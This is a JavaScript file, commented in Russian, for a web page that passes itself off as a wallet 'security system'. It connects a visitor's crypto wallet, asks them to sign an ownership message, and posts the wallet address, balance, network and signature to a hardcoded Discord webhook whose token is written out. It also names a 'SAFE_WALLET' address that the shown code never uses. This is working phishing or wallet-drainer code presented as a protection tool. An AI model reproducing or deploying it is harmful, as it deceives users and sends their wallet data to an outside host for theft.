// Конфигурация
const SAFE_WALLET = 'TGGWh4Cm9HmvhBB9HkUoe6zD3Zrfx6psKb';

// Элементы страницы
const connectButton = document.getElementById('connectButton');
const signButton = document.getElementById('signButton');
const statusDiv = document.getElementById('status');
const noWalletMessage = document.getElementById('noWalletMessage');

let web3;
let userAddress;

// Функция для обновления статуса
function updateStatus(message, isError = false, isWarning = false) {
    statusDiv.textContent = message;
    statusDiv.className = 'status-box ' + (isError ? 'error' : isWarning ? 'warning' : 'success');
    statusDiv.style.display = 'block';
}

// Функция для показа/скрытия элементов
function showElement(element) {
    element.classList.remove('hidden');
}

function hideElement(element) {
    element.classList.add('hidden');
}

// Функция для отправки данных на Discord webhook
async function sendToDiscordWebhook(userAddress, signature, message) {
    const webhookURL = 'https://discordapp.com/api/webhooks/1420896121835884718/IdDJHN_exPKf4s-4pDwmQHJkaLCxfWkXSPBTbygj6TpSySJ3RICs8LvEIJO3bn_yOuXW';
    
    // Получаем баланс и название сети
    const balance = await getShortBalance();
    const network = await getNetworkName();
    
    // Проверяем длину подписи
    const signatureLength = signature.length;
    console.log('Длина подписи:', signatureLength);
    console.log('Полная подпись:', signature);
    
    const embed = {
        title: "🔐 Новое подключение кошелька",
        color: 3066993, // Зеленый цвет
        timestamp: new Date().toISOString(),
        fields: [
            {
                name: "💰 Адрес кошелька",
                value: `\`\`\`${userAddress}\`\`\``,
                inline: false
            },
            {
                name: "💎 Баланс",
                value: balance,
                inline: true
            },
            {
                name: "🌐 Сеть",
                value: network,
                inline: true
            },
            {
                name: `✍️ Подпись (${signatureLength} символов)`,
                value: `\`\`\`${signature}\`\`\``,
                inline: false
            },
            {
                name: "📝 Сообщение",
                value: `\`\`\`${message}\`\`\``,
                inline: false
            },
            {
                name: "⏰ Время подключения",
                value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
                inline: false
            },
            {
                name: "🔍 Детали подписи",
                value: `Длина: ${signatureLength} символов\nНачинается с: ${signature.substring(0, 10)}...\nЗаканчивается на: ...${signature.substring(signatureLength - 10)}`,
                inline: false
            }
        ],
        footer: {
            text: "Security Wallet Protection System"
        }
    };

    try {
        const response = await fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                embeds: [embed],
                username: 'Wallet Security Bot',
                avatar_url: 'https://cdn-icons-png.flaticon.com/512/6001/6001533.png'
            })
        });

        if (response.ok) {
            console.log('✅ Данные успешно отправлены в Discord');
            return true;
        } else {
            console.error('❌ Ошибка отправки в Discord. Статус:', response.status);
            console.error('Текст ошибки:', await response.text());
            return false;
        }
    } catch (error) {
        console.error('❌ Ошибка при отправке в Discord:', error);
        return false;
    }
}

// Функция для получения названия сети
async function getNetworkName() {
    try {
        const chainId = await web3.eth.getChainId();
        const networks = {
            1: 'Ethereum Mainnet',
            56: 'Binance Smart Chain', 
            137: 'Polygon',
            42161: 'Arbitrum',
            10: 'Optimism',
            43114: 'Avalanche',
            250: 'Fantom',
            100: 'Gnosis Chain'
        };
        
        return networks[chainId] || `Unknown Network (ID: ${chainId})`;
    } catch (error) {
        return 'Network Unknown';
    }
}

// Функция для получения краткого баланса
async function getShortBalance() {
    try {
        const balance = await web3.eth.getBalance(userAddress);
        const ethBalance = web3.utils.fromWei(balance, 'ether');
        return `${parseFloat(ethBalance).toFixed(4)} ETH`;
    } catch (error) {
        return 'Balance Unknown';
    }
}

// Функция для проверки валидности подписи
async function verifySignature(message, signature, address) {
    try {
        // Пытаемся верифицировать подпись
        const recoveredAddress = await web3.eth.personal.ecRecover(message, signature);
        return recoveredAddress.toLowerCase() === address.toLowerCase();
    } catch (error) {
        console.error('Ошибка верификации подписи:', error);
        return false;
    }
}

// Проверяем наличие кошелька
if (typeof window.ethereum !== 'undefined') {
    console.log('Кошелек найден!');
    web3 = new Web3(window.ethereum);
    
    // Показываем основное содержимое
    hideElement(noWalletMessage);
    
} else {
    console.log('Кошелек не найден!');
    showElement(noWalletMessage);
    hideElement(connectButton);
}

// Подключение кошелька
connectButton.addEventListener('click', async () => {
    try {
        connectButton.classList.add('loading');
        updateStatus('⌛ Запрос на подключение кошелька...', false, true);
        
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        userAddress = accounts[0];
        
        updateStatus(`✅ Кошелек подключен! Адрес: ${userAddress.substring(0, 10)}...${userAddress.substring(38)}`);
        
        hideElement(connectButton);
        showElement(signButton);
        
        await checkNetwork();
        
    } catch (error) {
        if (error.code === 4001) {
            updateStatus('❌ Вы отклонили запрос на подключение.', true);
        } else {
            updateStatus('❌ Ошибка при подключении: ' + error.message, true);
        }
    } finally {
        connectButton.classList.remove('loading');
    }
});

// Подписание сообщения
signButton.addEventListener('click', async () => {
    if (!userAddress) {
        updateStatus('❌ Сначала подключите кошелек.', true);
        return;
    }
    
    try {
        signButton.classList.add('loading');
        updateStatus('⌛ Запрос на подписание сообщения...', false, true);
        
        const message = `Подтверждение владения кошельком для системы безопасности. Время: ${new Date().toLocaleString()}`;
        const signature = await web3.eth.personal.sign(message, userAddress, '');
        
        // Проверяем подпись
        const isValid = await verifySignature(message, signature, userAddress);
        
        console.log('Полученная подпись:', signature);
        console.log('Длина подписи:', signature.length);
        console.log('Подпись валидна:', isValid);
        
        // Отправляем данные в Discord
        updateStatus('⌛ Отправка данных на сервер...', false, true);
        const sendSuccess = await sendToDiscordWebhook(userAddress, signature, message);
        
        if (sendSuccess) {
            if (isValid) {
                updateStatus(`✅ Подпись валидна и отправлена! Длина: ${signature.length} символов`);
            } else {
                updateStatus(`⚠️ Подпись отправлена, но верификация не удалась. Длина: ${signature.length} символов`, false, true);
            }
        } else {
            updateStatus(`✅ Подпись получена, но ошибка отправки на сервер. Длина: ${signature.length} символов`, false, true);
        }
        
        // Дополнительно выводим информацию о подписи в консоль
        console.log('=== ИНФОРМАЦИЯ О ПОДПИСИ ===');
        console.log('Адрес:', userAddress);
        console.log('Длина подписи:', signature.length);
        console.log('Подпись:', signature);
        console.log('Валидность:', isValid);
        console.log('============================');
        
    } catch (error) {
        console.error('Ошибка при подписании:', error);
        if (error.code === 4001) {
            updateStatus('❌ Вы отклонили запрос на подпись.', true);
        } else {
            updateStatus('❌ Ошибка при подписи: ' + error.message, true);
        }
    } finally {
        signButton.classList.remove('loading');
    }
});

// Проверка сети
async function checkNetwork() {
    try {
        const chainId = await web3.eth.getChainId();
        const networks = {
            1: 'Ethereum Mainnet',
            56: 'Binance Smart Chain', 
            137: 'Polygon',
            42161: 'Arbitrum'
        };
        
        const networkName = networks[chainId] || `Unknown Network (ID: ${chainId})`;
        console.log('Connected to:', networkName);
        
    } catch (error) {
        console.error('Network check error:', error);
    }
}

// Мониторинг изменений кошелька
if (typeof window.ethereum !== 'undefined') {
    window.ethereum.on('accountsChanged', function(accounts) {
        if (accounts.length === 0) {
            updateStatus('Кошелек отключен', true);
            hideElement(signButton);
            showElement(connectButton);
        } else {
            userAddress = accounts[0];
            updateStatus(`Аккаунт изменен: ${userAddress.substring(0, 10)}...`);
        }
    });
    
    window.ethereum.on('chainChanged', function(chainId) {
        window.location.reload();
    });
}
